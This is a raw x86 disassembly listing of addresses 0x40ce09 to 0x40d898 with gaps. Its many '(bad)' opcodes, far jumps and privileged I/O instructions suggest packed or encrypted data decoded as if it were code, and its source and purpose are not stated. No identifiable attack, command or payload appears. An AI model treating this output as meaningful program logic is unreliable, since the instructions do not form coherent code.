  40ce09:	sbb    DWORD PTR [esi],esp
  40ce0b:	scas   eax,DWORD PTR es:[edi]
  40ce0c:	inc    ecx
  40ce0d:	mov    bl,0xfa
  40ce0f:	cmp    edx,DWORD PTR [ecx]
  40ce11:	leave  
  40ce12:	add    BYTE PTR [ecx],cl
  40ce14:	test   eax,0x3f190dc8
  40ce19:	and    DWORD PTR [ecx-0x1a],ebp
  40ce1c:	stc    
  40ce1d:	dec    edi
  40ce1e:	add    edi,DWORD PTR [esi+0x6b298cf5]
  40ce24:	jmp    0xec65bbf1
  40ce29:	stc    
  40ce2a:	and    ch,bh
  40ce2c:	dec    eax
  40ce2d:	fisub  WORD PTR [ebx]
  40ce2f:	and    eax,0xa42c8d1
  40ce34:	leave  
  40ce35:	dec    esi
  40ce36:	loope  0x40ce53
  40ce38:	std    
  40ce39:	leave  
  40ce3a:	lds    esp,FWORD PTR [esp]
  40ce3d:	jl     0x40cdfd
  40ce3f:	scas   al,BYTE PTR es:[edi]
  40ce40:	cmp    DWORD PTR [ebx-0x3756da91],esi
  40ce46:	inc    edx
  40ce47:	or     BYTE PTR [ecx-0x16e40eb2],ah
  40ce4d:	leave  
  40ce4e:	popf   
  40ce4f:	and    al,0x26
  40ce51:	fs xor eax,0xd3c989c3
  40ce57:	pop    ecx
  40ce58:	neg    BYTE PTR [ecx]
  40ce5a:	jmp    0x9193c183
  40ce5f:	repnz add BYTE PTR [eax],al
	...
  40ce8a:	jb     0x40ce54
  40ce8c:	push   DWORD PTR [ebp-0x3b]
  40ce8f:	gs pop esp
  40ce91:	sub    BYTE PTR [edx],bh
  40ce93:	xor    eax,DWORD PTR [edx]
  40ce95:	jmp    0xd53fa9d7
  40ce9a:	push   ebp
  40ce9b:	rcr    BYTE PTR [esi],0x54
  40ce9e:	and    cl,al
  40cea0:	(bad)  
  40cea1:	aam    0x19
  40cea3:	enter  0xf174,0x55
  40cea7:	mov    ebx,DWORD PTR [esi+edi*1+0x205e285a]
  40ceae:	jg     0x40cf0f
  40ceb0:	add    BYTE PTR [esi+eiz*4+0x6d2d80b7],dl
  40ceb7:	sar    dh,1
  40ceb9:	push   ds
  40ceba:	mov    BYTE PTR [esi],bl
  40cebc:	cld    
  40cebd:	mov    ecx,0xe104e62
  40cec2:	rcl    BYTE PTR [ebx-0x18],1
  40cec5:	das    
  40cec6:	ja     0x40cf23
  40cec8:	add    dl,dh
  40ceca:	jge    0x40cf24
  40cecc:	test   DWORD PTR [ebx+0x26005b3f],ebp
  40ced2:	mov    al,ds:0x3de8ffcf
  40ced7:	pop    ebx
  40ced8:	(bad)  
  40ced9:	and    al,0x36
  40cedb:	enter  0xe906,0x3d
  40cedf:	xor    eax,0x353a4300
  40cee4:	add    BYTE PTR [ebx+0x42],dl
  40cee7:	(bad)  
  40cee8:	inc    esp
  40cee9:	mov    ch,0xea
  40ceeb:	(bad)  
  40ceec:	test   BYTE PTR [ebp+0x0],bh
	...
  40cf16:	add    BYTE PTR [eax],al
  40cf18:	inc    ebp
  40cf19:	enter  0x19fe,0x5d
  40cf1d:	dec    esi
  40cf1e:	clc    
  40cf1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cf20:	mov    bh,0xc3
  40cf22:	out    0x81,eax
  40cf24:	rcr    BYTE PTR [edx+0x0],0xe2
  40cf28:	std    
  40cf29:	dec    esi
  40cf2a:	add    eax,0x5d3780
  40cf2f:	add    BYTE PTR [edi-0xd],ah
  40cf32:	test   BYTE PTR [eax+0x26],cl
  40cf35:	pop    edi
  40cf36:	push   DWORD PTR [ebp-0x79]
  40cf39:	jae    0x40cf24
  40cf3b:	mov    eax,ds:0x8b507bd0
  40cf40:	pop    ss
  40cf41:	jmp    0x50ff:0x7be8f484
  40cf48:	test   DWORD PTR [ebx-0x27],esi
  40cf4b:	mov    eax,ds:0x85897bf0
  40cf50:	ja     0x40cfb4
  40cf52:	(bad)  
  40cf53:	dec    DWORD PTR [edi+0x70ff9cca]
  40cf59:	cmc    
  40cf5a:	(bad)  
  40cf5b:	addr16 (bad) 
  40cf5d:	push   es
  40cf5e:	inc    eax
  40cf5f:	add    BYTE PTR [eax+0x24],ah
  40cf62:	lock div DWORD PTR [eax]
  40cf65:	jp     0x40cf66
  40cf67:	jne    0x40cf8c
  40cf69:	jae    0x40cf9d
  40cf6b:	mov    eax,ds:0x85897a30
  40cf70:	dec    ebx
  40cf71:	(bad)  
  40cf72:	(bad)  
  40cf73:	dec    ebp
  40cf75:	pop    edx
  40cf76:	push   0xfe9fd34a
  40cf7b:	inc    BYTE PTR [eax]
	...
  40cfa5:	add    BYTE PTR [edx],ch
  40cfa7:	outs   dx,DWORD PTR ds:[esi]
  40cfa8:	idiv   edi
  40cfaa:	loopne 0x40d025
  40cfac:	jne    0x40cfba
  40cfae:	out    dx,eax
  40cfaf:	rcr    DWORD PTR [edi-0x7b280f01],0xec
  40cfb6:	call   0xa7abcf34
  40cfbb:	repnz push ecx
  40cfbd:	pop    esp
  40cfbe:	pop    di
  40cfc0:	push   DWORD PTR [ebp-0x9e19]
  40cfc6:	shl    bl,1
  40cfc8:	or     ch,al
  40cfca:	jecxz  0x40d006
  40cfcc:	(bad)  
  40cfcd:	dec    DWORD PTR [esi]
  40cfcf:	shl    edi,cl
  40cfd1:	idiv   DWORD PTR [esi]
  40cfd3:	in     eax,dx
  40cfd4:	and    DWORD PTR [edx+0x3e],ebp
  40cfd7:	pop    esp
  40cfd8:	rcr    BYTE PTR [ebx-0x1],0xb3
  40cfdc:	and    DWORD PTR [ebp-0xddb292],esi
  40cfe2:	imul   eax,edi,0x145fe80e
  40cfe8:	and    bh,bh
  40cfea:	(bad)  
  40cfeb:	aaa    
  40cfec:	aas    
  40cfed:	not    DWORD PTR [ecx+0x25]
  40cff0:	nop
  40cff1:	test   DWORD PTR [esi+0x25],ebx
  40cff4:	and    bh,bh
  40cff6:	out    dx,al
  40cff7:	fwait
  40cff8:	scas   al,BYTE PTR es:[edi]
  40cff9:	pop    ebx
  40cffa:	jg     0x40cfb0
  40cffc:	and    DWORD PTR [ebp-0xdd72d2],esi
  40d002:	sub    edi,eax
  40d004:	ins    BYTE PTR es:[edi],dx
  40d005:	dec    eax
  40d006:	jg     0x40cfbc
  40d008:	sub    bh,BYTE PTR [esi+0x0]
	...
  40d032:	add    BYTE PTR [eax],al
  40d034:	fidivr WORD PTR [edx+eiz*1+0xb]
  40d038:	(bad)  
  40d039:	out    dx,eax
  40d03a:	sti    
  40d03b:	or     bl,0x53
  40d03e:	sbb    bh,bh
  40d040:	add    eax,eax
  40d042:	xchg   edi,eax
  40d043:	psubw  mm0,QWORD PTR [ebx]
  40d046:	xchg   edx,eax
  40d047:	test   DWORD PTR [esi],edx
  40d049:	int    0x20
  40d04b:	dec    DWORD PTR [esi-0x1e6271a4]
  40d051:	mov    ah,0x2c
  40d053:	adc    al,0x45
  40d055:	hlt    
  40d056:	xchg   edi,eax
  40d057:	add    eax,0x9ca0ac6e
  40d05c:	leave  
  40d05d:	lods   al,BYTE PTR ds:[esi]
  40d05e:	dec    eax
  40d05f:	test   esi,esp
  40d061:	lods   al,BYTE PTR ds:[esi]
  40d062:	and    bh,bh
  40d064:	push   ebx
  40d065:	mov    ah,0x2
  40d067:	add    bl,al
  40d069:	ds xor al,0xf7
  40d06c:	test   eax,0x2967b40c
  40d071:	pop    eax
  40d072:	ret    
  40d073:	call   FWORD PTR [eax-0x76eba3a6]
  40d079:	lds    ebx,FWORD PTR [ebp-0x7ea8ecdf]
  40d07f:	xchg   ebp,eax
  40d080:	mov    eax,ds:0xc38b8dc5
  40d085:	scas   al,BYTE PTR es:[edi]
  40d086:	jge    0x40d0a9
  40d088:	jno    0x40d063
  40d08a:	cmp    ebp,DWORD PTR [eax]
  40d08c:	jno    0x40d053
  40d08e:	jne    0x40d094
  40d090:	xor    edi,ebx
  40d092:	push   ecx
  40d093:	add    al,0x3e
  40d095:	pop    ebx
  40d096:	push   0x5f
	...
  40d0c0:	add    BYTE PTR [eax],al
  40d0c2:	(bad)  
  40d0c3:	int    0x5d
  40d0c5:	and    DWORD PTR [esi],edi
  40d0c7:	push   esi
  40d0c8:	ins    DWORD PTR es:[edi],dx
  40d0c9:	xchg   edx,eax
  40d0ca:	ds pop ebx
  40d0cc:	jmp    0x3df4cc55
  40d0d1:	and    DWORD PTR [ecx],esi
  40d0d3:	pop    esp
  40d0d4:	out    dx,al
  40d0d5:	xchg   DWORD PTR [edi-0x69fc16a5],edi
  40d0db:	imul   ebp,ecx,0x30
  40d0de:	fadd   st,st(4)
  40d0e0:	fwait
  40d0e1:	or     esp,DWORD PTR [esi]
  40d0e3:	stos   BYTE PTR es:[edi],al
  40d0e4:	jg     0x40d107
  40d0e6:	or     ebp,eax
  40d0e8:	pop    ebx
  40d0e9:	xor    BYTE PTR [ecx],cl
  40d0eb:	lds    ecx,FWORD PTR ds:0x11537321
  40d0f1:	jmp    0xb3b3:0x20fdc4d7
  40d0f8:	std    
  40d0f9:	and    cl,ah
  40d0fb:	les    esi,FWORD PTR [ebx+0xb]
  40d0fe:	out    0x63,al
  40d100:	and    DWORD PTR [eax],0xffffffd1
  40d103:	les    edx,FWORD PTR [ebx-0x2a3b2ed9]
  40d109:	and    BYTE PTR [ebx+0x53],cl
  40d10c:	ror    DWORD PTR ds:0x20c5c4d4,0xeb
  40d113:	mov    ds:0xc4a920b5,eax
  40d118:	(bad)  
  40d119:	cmp    esi,DWORD PTR [edx]
  40d11b:	mov    bl,0x99
  40d11d:	push   eax
  40d11e:	pop    esi
  40d11f:	(bad)  
  40d120:	(bad)  
  40d121:	pop    esp
  40d122:	push   ecx
  40d123:	int3   
  40d124:	(bad)  
  40d125:	sahf   
	...
  40d14e:	add    BYTE PTR [eax],al
  40d150:	pop    esi
  40d151:	dec    esi
  40d152:	or     BYTE PTR [ecx-0x71011db1],al
  40d158:	ret    0xd406
  40d15b:	jle    0x40d17b
  40d15d:	(bad)  
  40d15e:	push   esp
  40d160:	push   0xffffffd9
  40d162:	mov    esp,0xfec44699
  40d167:	in     eax,0xb0
  40d169:	push   0xffffff8b
  40d16b:	ins    BYTE PTR es:[edi],dx
  40d16c:	or     esp,ecx
  40d16e:	(bad)  
  40d16f:	pop    esi
  40d170:	push   ds
  40d171:	mov    edi,edi
  40d173:	fdiv   QWORD PTR ds:0x5e7069b3
  40d179:	(bad)  
  40d17a:	jmp    0x35b4:0xfdc3e3f3
  40d181:	mov    bl,0x5d
  40d183:	push   eax
  40d184:	pop    esi
  40d185:	(bad)  
  40d186:	(bad)  
  40d187:	je     0x40d1ea
  40d189:	int3   
  40d18a:	(bad)  
  40d18b:	es gs stc 
  40d18e:	fwait
  40d18f:	push   ds
  40d190:	pop    esi
  40d191:	les    esi,FWORD PTR [ebp+eax*1+0x1fec426]
  40d198:	jbe    0x40d181
  40d19a:	inc    BYTE PTR [esi]
  40d19c:	push   ds
  40d19d:	push   cs
  40d19e:	call   0xe8051b99
  40d1a3:	gs popa 
  40d1a5:	(bad)  
  40d1a6:	(bad)  
  40d1a7:	out    dx,al
  40d1a8:	jae    0x40d151
  40d1aa:	mul    dh
  40d1ac:	xor    DWORD PTR [ebx-0x3bd68280],esi
  40d1b2:	(bad)  
  40d1b3:	pushf  
	...
  40d1dc:	add    BYTE PTR [eax],al
  40d1de:	push   es
  40d1df:	int3   
  40d1e0:	dec    dh
  40d1e2:	push   0x4d
  40d1e4:	pushf  
  40d1e5:	add    BYTE PTR [eax+0x63],bh
  40d1e8:	push   DWORD PTR [ebp-0x9419]
  40d1ee:	call   0x533fdcd4
  40d1f3:	push   edi
  40d1f4:	call   0xffa4acb2
  40d1f9:	push   edx
  40d1fb:	outs   dx,BYTE PTR ds:[esi]
  40d1fc:	idiv   edi
  40d1fe:	test   al,0x76
  40d200:	pop    edx
  40d201:	pushf  
  40d202:	enter  0xff63,0x45
  40d206:	mov    edi,0xe8fdcd75
  40d20b:	arpl   di,di
  40d20d:	jne    0x40d1fa
  40d20f:	jbe    0x40d287
  40d211:	mov    BYTE PTR [edi+0x57],ah
  40d214:	leave  
  40d215:	ret    0x574b
  40d218:	push   ebp
  40d219:	mov    edi,ebx
  40d21b:	xlat   BYTE PTR ds:[ebx]
  40d21c:	ret    
  40d21d:	cld    
  40d21e:	jge    0x40d277
  40d220:	push   0x1c
  40d222:	mov    ah,ah
  40d224:	push   es
  40d225:	call   0x401235
  40d22a:	scas   al,BYTE PTR es:[edi]
  40d22b:	xchg   esp,eax
  40d22c:	cli    
  40d22d:	push   0x3f9b95
  40d232:	push   0xe648a8a4
  40d237:	pop    esi
  40d238:	push   DWORD PTR [ebp+0xf]
  40d23b:	ja     0x40d2af
  40d23d:	std    
  40d23e:	sub    BYTE PTR [edx+0x68],ah
  40d241:	add    BYTE PTR [eax],0x0
	...
  40d26c:	stos   DWORD PTR es:[edi],eax
  40d26d:	xchg   edi,eax
  40d26e:	(bad)  
  40d26f:	addr16 in eax,0x5e
  40d272:	add    BYTE PTR [eax-0x17f91c18],al
  40d278:	mov    bh,0x7b
  40d27a:	(bad)  
  40d27b:	(bad)  
  40d27c:	call   0x7340cd64
  40d281:	dec    edi
  40d282:	call   0xffa29106
  40d287:	leave  
  40d288:	test   BYTE PTR ds:[esi],0x0
  40d28c:	adc    edi,DWORD PTR ds:0x7a812f
  40d292:	sbb    eax,0x42ea9ff
  40d297:	push   0x43
  40d299:	or     DWORD PTR [eax+0x7d54a607],ebx
  40d29f:	call   DWORD PTR [ecx+0x16fbc84b]
  40d2a5:	mov    eax,0x373e0003
  40d2aa:	mov    bh,dh
  40d2ac:	js     0x40d27f
  40d2ae:	sbb    eax,0x85c26650
  40d2b3:	add    BYTE PTR [esi],bh
  40d2b5:	int    0x42
  40d2b7:	je     0x40d2cb
  40d2b9:	pop    es
  40d2ba:	pop    es
  40d2bb:	add    DWORD PTR [esi],edi
  40d2bd:	mov    ah,0x95
  40d2bf:	and    al,0xe6
  40d2c1:	fnstsw WORD PTR [esi-0x77d0c1c0]
  40d2c7:	test   DWORD PTR [eax+0x29],0x926501e
  40d2ce:	jle    0x40d2cf
	...
  40d2f8:	add    BYTE PTR [eax],al
  40d2fa:	xor    esp,esp
  40d2fc:	stos   BYTE PTR es:[edi],al
  40d2fd:	jmp    FWORD PTR [ecx]
  40d2ff:	adc    DWORD PTR [ebp+0x50],ebx
  40d302:	and    edi,edi
  40d304:	or     ch,al
  40d306:	shl    BYTE PTR [edx+0x1e],1
  40d309:	jmp    DWORD PTR [esi]
  40d30b:	adc    BYTE PTR [edx-0x1],bh
  40d30e:	or     DWORD PTR [ecx-0x68],esp
  40d311:	sti    
  40d312:	add    edi,ebx
  40d314:	or     ch,al
  40d316:	push   ecx
  40d317:	dec    ebx
  40d318:	push   ds
  40d319:	inc    DWORD PTR [edi]
  40d31b:	jbe    0x40d324
  40d31d:	add    BYTE PTR [ebx-0x57cd0b3],dl
  40d323:	(bad)  
  40d324:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d325:	jmp    DWORD PTR [edi-0x6e]
  40d328:	sbb    eax,0xd15b4675
  40d32d:	pop    ecx
  40d32e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d32f:	rcr    ebp,0x8b
  40d332:	jnp    0x40d2f3
  40d334:	inc    eax
  40d335:	add    al,0x3e
  40d337:	mov    dl,0x8e
  40d339:	lods   al,BYTE PTR ds:[esi]
  40d33a:	fstp   DWORD PTR [esi]
  40d33c:	sub    BYTE PTR [esi+edx*1],al
  40d33f:	pop    es
  40d340:	sbb    eax,0x3bc0a1c3
  40d345:	or     al,0xa6
  40d347:	clc    
  40d348:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d349:	sbb    eax,0x201bc191
  40d34e:	mov    DWORD PTR [edi-0xf],eax
  40d351:	sub    esp,DWORD PTR [edx-0x1e]
  40d354:	xchg   ebp,eax
  40d355:	sbb    eax,0x3e49c87
  40d35a:	or     edx,esi
  40d35c:	xchg   esp,eax
  40d35d:	add    DWORD PTR [eax],0x0
	...
  40d388:	and    BYTE PTR [esi-0x309ee28b],0x2b
  40d38f:	and    dh,ch
  40d391:	shl    ebx,0xf3
  40d394:	push   eax
  40d395:	inc    edi
  40d396:	cmc    
  40d397:	sub    edx,edx
  40d399:	fld1   
  40d39b:	add    esi,DWORD PTR ds:0x3286e59b
  40d3a1:	pop    ebx
  40d3a2:	jmp    0x4157ccaa
  40d3a7:	add    al,0x3e
  40d3a9:	pop    ebx
  40d3aa:	jmp    0x36084ef3
  40d3af:	add    eax,0x3c35b3e
  40d3b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d3b5:	pop    ebx
  40d3b6:	xchg   ebx,eax
  40d3b7:	add    edx,DWORD PTR [ebx+ebx*2+0x2c0dc76c]
  40d3be:	fs xchg edx,esi
  40d3c1:	enter  0x1d0d,0x8e
  40d3c5:	sar    BYTE PTR [ebx+0x1b],0xe9
  40d3c9:	inc    esi
  40d3ca:	std    
  40d3cb:	sub    edi,DWORD PTR [eax-0x28]
  40d3ce:	(bad)  
  40d3cf:	call   0x76012811
  40d3d4:	cmp    BYTE PTR [edx+0x5b3de8b6],dh
  40d3da:	push   0x1bf567
  40d3df:	(bad)  
  40d3e0:	rcl    BYTE PTR [eax-0x18],1
  40d3e3:	jbe    0x40d418
  40d3e5:	sar    dh,0x19
  40d3e8:	mov    bh,0xab
  40d3ea:	mov    WORD PTR [eax+eax*1+0x0],fs
	...
  40d416:	dec    ecx
  40d417:	enter  0xb6fe,0xcd
  40d41b:	sub    ch,al
  40d41d:	adc    ax,ax
  40d420:	(bad)  
  40d421:	jo     0x40d3e3
  40d423:	retf   
  40d424:	neg    BYTE PTR [esi+0x73dcb322]
  40d42a:	pop    edx
  40d42b:	ror    BYTE PTR [esp+eiz*2-0x790137e3],0xad
  40d433:	cmp    BYTE PTR [esi-0x23f82e3],bh
  40d439:	cmp    al,0x2d
  40d43b:	enter  0x6efe,0x32
  40d43f:	inc    esi
  40d440:	or     al,0x51
  40d442:	push   es
  40d443:	fdivp  st(6),st
  40d445:	pop    esi
  40d446:	mov    ah,0xd6
  40d448:	jecxz  0x40d4a8
  40d44a:	pop    edx
  40d44b:	shr    BYTE PTR [ecx-0x17],0xe5
  40d44f:	cwde   
  40d450:	pop    ebx
  40d451:	test   al,0x3d
  40d453:	shl    BYTE PTR [ecx+edi*1+0x36fec04a],0xb0
  40d45b:	push   ebx
  40d45c:	call   0xff01648a
  40d461:	jo     0x40d423
  40d463:	scas   al,BYTE PTR es:[edi]
  40d464:	neg    BYTE PTR [esi]
  40d466:	and    dh,BYTE PTR ds:0x1f868100
  40d46c:	inc    ecx
  40d46d:	jmp    0x130dac4
  40d472:	call   0x6b40d3da
  40d477:	push   eax
  40d478:	call   0x40d522
	...
  40d4a1:	add    BYTE PTR [eax],al
  40d4a3:	add    BYTE PTR [edx+0x5f],dh
  40d4a6:	dec    DWORD PTR [ecx-0x88ba6]
  40d4ac:	loopne 0x40d49e
  40d4ae:	(bad)  
  40d4af:	mov    eax,DWORD PTR [bp+si]
  40d4b2:	inc    eax
  40d4b3:	add    BYTE PTR [eax-0x7f080fd7],dl
  40d4b9:	arpl   di,di
  40d4bb:	jne    0x40d470
  40d4bd:	jae    0x40d449
  40d4bf:	popf   
  40d4c0:	loopne 0x40d525
  40d4c2:	mov    DWORD PTR [ebp-0x944d],eax
  40d4c8:	std    
  40d4c9:	push   esi
  40d4ca:	push   0xfe9603e2
  40d4cf:	(bad)  
  40d4d0:	jmp    0x7563:0xd0fff766
  40d4d7:	or     al,0xbf
  40d4d9:	repz fwait
  40d4db:	inc    eax
  40d4dd:	int    0x84
  40d4df:	fsubr  st,st(0)
  40d4e1:	arpl   di,di
  40d4e3:	push   0x67
  40d4e5:	repz sbb al,0x5d
  40d4e8:	es push edi
  40d4ea:	push   DWORD PTR [ebp-0x9419]
  40d4f0:	loopne 0x40d4db
  40d4f2:	or     ch,al
  40d4f4:	sti    
  40d4f5:	inc    ebx
  40d4f6:	(bad)  
  40d4f7:	call   FWORD PTR [esi-0x7f082c24]
  40d4fd:	bound  eax,QWORD PTR [ebx-0x958443]
  40d503:	jmp    DWORD PTR [edi]
  40d505:	iret   
  40d506:	ja     0x40d48b
	...
  40d530:	add    BYTE PTR [eax],al
  40d532:	mov    ds:0x60fff773,al
  40d537:	push   edi
  40d538:	je     0x40d5aa
  40d53a:	xchg   esp,eax
  40d53b:	and    al,0xe8
  40d53d:	idiv   DWORD PTR [esi]
  40d53f:	sbb    eax,DWORD PTR gs:[eax]
  40d542:	push   0xffffffd5
  40d544:	stos   BYTE PTR es:[edi],al
  40d545:	(bad)  
  40d547:	gs pop edx
  40d549:	jmp    FWORD PTR [ebx-0x34]
  40d54c:	sub    bh,BYTE PTR [edi-0xe63a50]
  40d552:	mov    eax,eax
  40d554:	adc    edi,edi
  40d556:	leave  
  40d557:	mov    ch,0x8f
  40d559:	pop    es
  40d55a:	(bad)  
  40d55b:	shl    DWORD PTR [ecx-0x1],0xb9
  40d55f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d560:	dec    edi
  40d561:	call   0xff5a630f
  40d566:	xor    ecx,esp
  40d568:	sub    al,BYTE PTR ds:0xff19fdc9
  40d56e:	rcl    DWORD PTR [ecx+edx*1+0x4fed91ff],cl
  40d575:	in     al,0x91
  40d577:	cmc    
  40d578:	sbb    edi,edi
  40d57a:	or     ecx,esp
  40d57c:	sub    al,ch
  40d57e:	shl    ch,1
  40d580:	sbb    edi,edi
  40d582:	stos   DWORD PTR es:[edi],eax
  40d583:	or     al,0x12
  40d585:	jmp    FWORD PTR [ecx-0x2b]
  40d588:	pop    DWORD PTR [edi]
  40d58a:	push   esi
  40d58b:	shl    DWORD PTR [eax-0x1],1
  40d58e:	pop    ecx
  40d58f:	inc    ebp
  40d590:	push   eax
  40d591:	fmul   QWORD PTR [ecx+0x2d]
  40d594:	sbb    bh,bh
	...
  40d5be:	add    BYTE PTR [eax],al
  40d5c0:	ror    ebx,cl
  40d5c2:	sub    dl,ch
  40d5c4:	test   al,0x1d
  40d5c6:	sbb    bh,bh
  40d5c8:	repz jg 0x40d5dd
  40d5cb:	push   DWORD PTR [ecx]
  40d5cd:	or     eax,0x6d160790
  40d5d2:	jno    0x40d5d3
  40d5d4:	and    DWORD PTR [ebp+0x50],edi
  40d5d7:	in     al,0x11
  40d5d9:	test   DWORD PTR [edx],ebx
  40d5db:	call   0xff5b00c7
  40d5e0:	or     DWORD PTR [ebx+0x5c],ebx
  40d5e3:	daa    
  40d5e4:	or     DWORD PTR [esi-0x1c27d4e3],edi
  40d5ea:	adc    eax,0x107f11a
  40d5ef:	adc    ch,cl
  40d5f1:	mov    ebp,0xbdc77610
  40d5f6:	std    
  40d5f7:	sbb    DWORD PTR [ebx-0x2ee60262],edx
  40d5fd:	mov    dl,0x60
  40d5ff:	jl     0x40d5ca
  40d601:	mov    ebp,0xc5e64fe5
  40d606:	fstp   QWORD PTR [ecx]
  40d608:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d609:	aas    
  40d60a:	jo     0x40d625
  40d60c:	mov    cl,0xbd
  40d60e:	xchg   ebx,eax
  40d60f:	xor    BYTE PTR [ecx+0x2c2cc5bd],dh
  40d615:	in     al,0xbd
  40d617:	sbb    DWORD PTR [ecx-0x6eee46f9],ebx
  40d61d:	mov    ebp,0xbe358fad
  40d622:	sbb    ecx,DWORD PTR [eax+eax*1]
	...
  40d64d:	add    BYTE PTR [esi+0x79199f55],dl
  40d653:	mov    ebp,0xbd69145b
  40d658:	lea    ebp,[eax+edx*1]
  40d65b:	in     al,0x85
  40d65d:	sbb    DWORD PTR [ecx+0x17],esp
  40d660:	sub    DWORD PTR [ebx],0x1975bd35
  40d666:	push   ecx
  40d667:	inc    edi
  40d668:	ins    DWORD PTR es:[edi],dx
  40d669:	sub    al,0xcc
  40d66b:	xlat   BYTE PTR ds:[ebx]
  40d66c:	call   0xecd94d74
  40d671:	add    edx,DWORD PTR [ebx-0x57abb30]
  40d677:	mov    edi,0x5c9403c2
  40d67c:	inc    esi
  40d67d:	(bad)  
  40d67e:	cmp    DWORD PTR [ebx-0x42e68e30],esi
  40d684:	call   FWORD PTR [edi-0x2f]
  40d687:	shl    BYTE PTR [edi+0x46],0xc6
  40d68b:	sbb    eax,DWORD PTR [eax]
  40d68d:	es icebp 
  40d68f:	repnz inc edi
  40d691:	test   al,0x3d
  40d693:	mov    esp,0x9b25e174
  40d698:	cld    
  40d699:	push   cs
  40d69a:	inc    edi
  40d69b:	xor    esp,edi
  40d69d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d69e:	cld    
  40d69f:	mov    esp,0x5b3deb66
  40d6a4:	xor    dh,0xc0
  40d6a7:	push   esp
  40d6a8:	call   0xfefd07ec
  40d6ad:	out    0xb0,al
  40d6af:	sar    dh,0x54
	...
  40d6da:	add    BYTE PTR [eax],al
  40d6dc:	dec    edx
  40d6dd:	mov    bl,0x7a
  40d6df:	jg     0x40d737
  40d6e1:	mov    esp,0xbca9abc8
  40d6e6:	push   ebx
  40d6e7:	jb     0x40d742
  40d6e9:	fadd   st,st(3)
  40d6eb:	mov    ebp,0xe96a25cf
  40d6f0:	jecxz  0x40d74e
  40d6f2:	push   DWORD PTR [edx+edi*1]
  40d6f5:	mov    bl,0x1c
  40d6f7:	jg     0x40d71f
  40d6f9:	mov    esp,0xd0562488
  40d6fe:	xor    al,0xc7
  40d700:	test   DWORD PTR [ebx],ebx
  40d702:	add    BYTE PTR [edx-0x70],ah
  40d705:	mov    cl,BYTE PTR [eax+0x28]
  40d708:	cmp    bl,bl
  40d70a:	ds jmp 0xbca912d9
  40d710:	mov    BYTE PTR [ebx],bl
  40d712:	add    BYTE PTR [edi],dl
  40d714:	sbb    al,BYTE PTR [ecx+0x2b3de985]
  40d71a:	push   0x1af110
  40d71f:	mov    esi,0xe9856d65
  40d724:	cmp    eax,0x57000b21
  40d729:	int    0x2
  40d72b:	or     esi,DWORD PTR ds:0x7f5628cc
  40d731:	in     eax,0xa0
  40d733:	call   FWORD PTR [eax-0x10]
  40d736:	aas    
  40d737:	pop    ebp
  40d738:	(bad)  
  40d739:	push   edi
  40d73a:	push   eax
  40d73b:	call   0x401bb4
	...
  40d768:	add    BYTE PTR [eax],al
  40d76a:	mov    bh,0xef
  40d76c:	(bad)  
  40d76d:	(bad)  
  40d76e:	call   0x9a7d3f95
  40d773:	cwde   
  40d774:	dec    BYTE PTR [edi-0x28]
  40d777:	int    0x6
  40d779:	call   0x3ff0c7
  40d77e:	aas    
  40d77f:	fist   DWORD PTR [edi+0x16fd8ff]
  40d785:	inc    esi
  40d786:	daa    
  40d787:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d788:	(bad)  
  40d789:	je     0x40d718
  40d78b:	cld    
  40d78c:	cli    
  40d78d:	xor    edx,edi
  40d78f:	sbb    eax,0x6378ffff
  40d794:	repnz scas al,BYTE PTR es:[edi]
  40d796:	aas    
  40d797:	mov    esp,0xe9c89f73
  40d79c:	cli    
  40d79d:	call   DWORD PTR [edx+0x4f]
  40d7a0:	call   0xffa4da88
  40d7a5:	pop    edi
  40d7a6:	cmp    DWORD PTR [esi],ecx
  40d7a8:	ret    0x6704
  40d7ab:	or     cl,BYTE PTR [edx-0x3e52b14]
  40d7b1:	jmp    DWORD PTR [edx+0x53]
  40d7b4:	push   DWORD PTR [ebp+0x4f]
  40d7b7:	outs   dx,DWORD PTR ds:[esi]
  40d7b8:	cli    
  40d7b9:	xchg   edx,eax
  40d7ba:	enter  0x8963,0x45
  40d7be:	(bad)  [ebx+0x75]
  40d7c1:	cld    
  40d7c2:	fsubr  st,st(1)
  40d7c4:	push   es
  40d7c5:	call   0x4006c7
  40d7ca:	ds cmp eax,0xbc9
	...
  40d7f8:	xor    eax,0xbd419084
  40d7fd:	pop    ebx
  40d7fe:	add    al,0x74
  40d800:	pop    ebx
  40d801:	jns    0x40d794
  40d803:	sti    
  40d804:	es push es
  40d806:	jnp    0x40d807
  40d808:	or     ebp,edx
  40d80a:	adc    eax,0x91813275
  40d80f:	sti    
  40d810:	mov    ds,WORD PTR [ecx-0x6f]
  40d813:	pop    es
  40d814:	out    0x26,al
  40d816:	jb     0x40d817
  40d818:	jmp    0x328e620b
  40d81d:	inc    ebp
  40d81e:	(bad)  
  40d820:	push   edx
  40d821:	scas   al,BYTE PTR es:[edi]
  40d822:	mov    al,0xe7
  40d824:	inc    ebx
  40d825:	or     al,0x17
  40d827:	call   DWORD PTR ds:0xbd142b84
  40d82d:	aas    
  40d82e:	hlt    
  40d82f:	jmp    FWORD PTR ds:0x4e4589ac
  40d835:	xchg   ecx,eax
  40d836:	(bad)  
  40d837:	sti    
  40d838:	mov    ecx,0x95c289c4
  40d83d:	(bad)  
  40d83e:	jmp    0x7476002
  40d843:	add    bl,ch
  40d845:	cmp    al,0x27
  40d847:	call   DWORD PTR [ebx]
  40d849:	cwde   
  40d84a:	adc    eax,0x85cc3675
  40d84f:	xchg   edx,eax
  40d850:	jns    0x40d82b
  40d852:	adc    eax,0x17744275
  40d857:	jne    0x40d88f
  40d859:	fdiv   st(5),st
  40d85b:	xchg   edx,eax
	...
  40d884:	add    BYTE PTR [eax],al
  40d886:	popa   
  40d887:	loope  0x40d8d4
  40d889:	ret    0xc446
  40d88c:	scas   eax,DWORD PTR es:[edi]
  40d88d:	mov    ah,BYTE PTR [edx+0x45]
  40d890:	aas    
  40d891:	shl    al,0x50
  40d894:	mov    bl,0x82
  40d896:	ret    
  40d897:	pop    edx
  40d898:	icebp  
